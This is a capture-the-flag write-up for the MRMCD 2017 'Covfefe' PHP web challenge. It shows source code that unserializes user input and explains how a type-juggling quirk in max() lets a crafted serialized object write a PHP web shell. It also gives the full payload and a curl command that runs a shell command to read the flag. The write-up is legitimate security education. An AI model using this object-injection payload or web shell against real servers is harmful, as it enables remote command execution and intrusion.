---
title: "CTF MRMCD 2017 - Web - Covfefe"
description: "A web unserialize exploit"
---

# Challenge

This challenge was created for the MRMCD 2017 Ctf.

```
Do you have trouble to stay awake at the MRMCD?
No problem, we can BREW some Covfefe with various additions for you!
While drinking, you might also want to read /flag.txt?
```

The following sourcecode was given:

<button class="collapsible">Show Source</button>
<div class="collapsibleContent" markdown="1">

```php
<?php
$top = "
                        (
                          )     (
                   ___...(-------)-....___
               .-\"\"       )    (          \"\"-.
         .-'``'|-._             )         _.-|
        /  .--.|   `\"\"---...........---\"\"`   |
       /  /    |                             |
";
$middle = "       |  |    |                             |";
$bottom = "        \  \   |                             |
         `\ `\ |                             |
           `\ `|                             |
           _/ /\                             /
          (__/  \                           /
       _..---\"\"` \                         /`\"\"---.._
    .-'           \                       /          '-.
   :               `-.__             __.-'              :
   :                  ) \"\"---...---\"\" (                 :
    '._               `\"--...___...--\"`              _.'
      \\\"\"--..__                              __..--\"\"/
       '._     \"\"\"----.....______.....----\"\"\"     _.'
       jgs`\"\"--..,,_____            _____,,..--\"\"`
                        `\"\"\"----\"\"\"`";

class Covfefe {
    public $id = 42;
    public $allowed_additions = ["Milk","Cream","Whisky","Rum","Kahlua","Aquavit","Vanilla","Almond"];
    public $requested_additions = [];

    function __construct() {
        global $bottom;

        global $middle;
        $this->id = rand();
        $this->time = time();
        $this->add($bottom);
        $this->add($middle." <- Covfefe\n");
    }

    function request_ingredient($what) {
        if (in_array($what, $this->allowed_additions)) {
            $this->requested_additions[] = $what;
        }
    }

    function add_ingredient() {
        global $middle;
        $n = (time() - $this->time) / 10;
        $n = min(10, max((int)$n, 0));

        $what = $this->requested_additions[0];
        array_shift($this->requested_additions);
        if (in_array($what, $this->allowed_additions)) {
            $this->add(str_repeat($middle."\n", $n - 1));
            $this->add($middle." <- ".$what."\n");
        }
    }

    function add($line) {
        $id = max(0, $this->id);
        $fname = "covfefe/".$id;
        $content = file_get_contents($fname);
        file_put_contents($fname, $line.$content);
    }

    function get() {
        global $top;
        $id = max(0, $this->id); //implicit integer cast
        $fname = "covfefe/".$id;
        $content = file_get_contents($fname);
        unlink($fname);
        return $top . $content;
    }
}

header("HTTP/1.0 418 I'm a teapot");
$base = "http://".$_SERVER['SERVER_NAME'].$_SERVER["PHP_SELF"]."?";

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    if ($_SERVER['QUERY_STRING'] == "") {
        echo "Actually I'm not a Teapot, but a RFC2324 Covfefe machine...\n";
        echo "So let me BREW something for you!\n";
        echo "You can add additions[] Milk,Cream,Whisky,Rum,Kahlua,Aquavit,Vanilla,Almond";
    } else {
        $c = unserialize(base64_decode($_SERVER['QUERY_STRING']));
        echo $c->get();
    }
}
if ($_SERVER["REQUEST_METHOD"] == "BREW") {
    $c = new Covfefe;
    if (isset($_GET['additions'])) foreach ($_GET['additions'] as $what) $c->request_ingredient($what);

    echo "Covfefe is Brewed...\n";
    $action = $base.base64_encode(serialize($c));
    if (sizeof($c->requested_additions) == 0) {
        echo "You can GET your Covfefe at $action";
    } else {
        $addition = $c->requested_additions[0];
        echo "Say WHEN you want to stop to add $addition $action";
    }
}
if ($_SERVER["REQUEST_METHOD"] == "WHEN") {
    $c = unserialize(base64_decode($_SERVER['QUERY_STRING']));
    
    $addition = $c->requested_additions[0];
    $c->add_ingredient();
    echo "Added $addition\n";
    $action = $base.base64_encode(serialize($c));
    if (sizeof($c->requested_additions) == 0) {
        echo "You can GET your Covfefe at $action";
    } else {
        $addition = $c->requested_additions[0];
        echo "Say WHEN you want to stop to add $addition $action";
    }
}

echo "\n";
```
</div>


# Description

This challenge was a web service implementing the Hyper Text Coffee Pot Control Protocol ([RFC2324](https://tools.ietf.org/html/rfc2324)).
Visiting the site using a GET request will result in an error message, that a BREW request is required.
A list of additions can be provided as a GET parameter that should be included in the coffee.
Sending a WHEN request to the returned link will stop the addition the particular ingredient.
Finally, a GET request can be used to receive an ASCII art of the brewed coffee.
A typical interaction would look like this:


```
$ curl 127.0.0.1/covfefe.php
Actually I'm not a Teapot, but a RFC2324 Covfefe machine...
So let me BREW something for you!
You can add additions[] Milk,Cream,Whisky,Rum,Kahlua,Aquavit,Vanilla,Almond

$ curl -X BREW "127.0.0.1/covfefe.php?additions\[\]=Milk"
Covfefe is Brewed...
Say WHEN you want to stop to add Milk http://localhost/covfefe.php?Tzo3OiJDb3ZmZWZlIjo0On...

$ curl -X WHEN http://localhost/covfefe.php?Tzo3OiJDb3ZmZWZlIjo0OntzOjI6ImlkIjtpOjg4Njg4O...
Added Milk
You can GET your Covfefe at http://localhost/covfefe.php?Tzo3OiJDb3ZmZWZlIjo0OntzOjI6Imlk...

$ curl http://localhost/covfefe.php?Tzo3OiJDb3ZmZWZlIjo0OntzOjI6ImlkIjtpOjg4Njg4OTA4MTtzO...

                        (
                          )     (
                   ___...(-------)-....___
               .-""       )    (          ""-.
         .-'``'|-._             )         _.-|
        /  .--.|   `""---...........---""`   |
       /  /    |                             |
       |  |    |                             | <- Milk
       |  |    |                             | <- Covfefe
        \  \   |                             |
         `\ `\ |                             |
           `\ `|                             |
           _/ /\                             /
          (__/  \                           /
       _..---""` \                         /`""---.._
    .-'           \                       /          '-.
   :               `-.__             __.-'              :
   :                  ) ""---...---"" (                 :
    '._               `"--...___...--"`              _.'
      \""--..__                              __..--""/
       '._     """----.....______.....----"""     _.'
       jgs`""--..,,_____            _____,,..--""`
                        `"""----"""`

```

# Exploit

The obvious bug here is that the challenge state is a serialized object, therefore we can control all parameters.

```php
if ($_SERVER["REQUEST_METHOD"] == "WHEN") {
    $c = unserialize(base64_decode($_SERVER['QUERY_STRING']));
    ...
    $c->add_ingredient();
```

As the coffee is rendered in a file we might be able to drop a PHP shell and read the flag.
The first target would be to control the content of the file.
The WHEN method will call ```add_ingredient()``` what will write the first element of ```additions[]``` to the rendered file.
Even though it is checked, if the addition is allowed, we can control both attributes and therefore write arbitrary content to that file.

```php
class Covfefe {
    ...
    function add_ingredient() {
        ...
        $what = $this->requested_additions[0];
        ...
        if (in_array($what, $this->allowed_additions)) {
            ...
            $this->add($middle." <- ".$what."\n");
        }
    }
    ...
}
```

Second, we have to give the rendered file a .php extension.
The filename is derived in the ```add()``` method in the following way:
```php
function add($line) {
    $id = max(0, $this->id);
    $fname = "covfefe/".$id;
    $content = file_get_contents($fname);
    file_put_contents($fname, $line.$content);
}
```
Even though we can control the ```id``` attribute, ```max(0,$this->id)``` should return an integer and therefore, we cannot control the extension.
But we are doing PHP here, which will try to cast both arguments to integers and simply return the larger one without casting:

```php
php > echo max(0,"1.php");
1.php
```

Therefore we can use a single ```WHEN``` request to drop a PHP shell and read the flag. Here is the serialized object, that will drop a PHP shell:

```
O:7:"Covfefe":4:{
  s:2:"id";s:10:"339481.php";
  s:17:"allowed_additions";a:8:{
    i:0;s:4:"Milk";
    i:1;s:5:"Cream";
    i:2;s:6:"Whisky";
    i:3;s:3:"Rum";
    i:4;s:6:"Kahlua";
    i:5;s:7:"Aquavit";
    i:6;s:7:"Vanilla";
    i:7;s:29:"<?php system($_GET['cmd']);?>";
  }
  s:19:"requested_additions";a:1:{
    i:0;s:29:"<?php system($_GET['cmd']);?>";
  }
  s:4:"time";i:1503323731;
}

```

And recover the Flag:
```
$ curl http://ctf.canthack.me:8889/covfefe/339481.php?cmd=cat+/flag.txt
       |  |    |                             | <- MRMCD{418_C0vf3f3_4ll_0v3r_tH3_W0rld!}
       |  |    |                             |
```


# Files
- [exploit.py](exploit.py)
- [index.php](index.php)

- [Dockerfile](Dockerfile)
- [docker-covfefe.service](docker-covfefe.service)
- [entrypoint.sh](entrypoint.sh)
- [httpd.conf](httpd.conf)
- [setup_httpd.sh](setup_httpd.sh)
- [flag.txt](flag.txt)
